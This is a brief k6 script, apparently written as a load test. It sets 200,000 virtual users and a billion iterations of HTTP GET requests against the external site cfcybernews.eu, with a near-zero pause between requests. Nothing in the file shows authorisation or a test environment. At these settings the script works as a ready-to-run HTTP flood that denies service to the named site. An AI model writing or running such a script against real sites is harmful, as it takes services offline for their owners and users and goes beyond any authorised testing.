import http from 'k6/http';
import { sleep } from 'k6';

export let options = {
  vus: 200000,
  iterations: 1000000000
};
export default function () {
  http.get('https://cfcybernews.eu');
  sleep(0.0000000000001);
}
